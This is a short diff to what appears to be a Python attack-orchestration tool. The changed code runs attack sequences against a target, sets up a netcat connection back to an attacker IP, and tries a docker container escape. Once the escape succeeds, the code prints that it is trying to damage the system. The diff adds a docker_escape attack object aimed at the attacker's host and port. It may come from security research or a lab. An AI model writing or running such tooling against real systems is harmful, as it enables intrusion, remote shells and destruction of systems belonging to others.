@@ -112,7 +112,6 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                 print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
                 continue
                     
-
             session=mc.attempt_attack(attack_obj)
 
             print(session)
@@ -140,7 +139,10 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                         
                         mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
+                        
+                        docker_escape_attack_obj = attack_db.create_attack("docker_escape", None, attacker_ip, 2345)
                         escape=mc.docker_escape(atk_sess)
+                        
                         if(escape):
                             print(escape)
                             print(f"{C.COL_GREEN} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
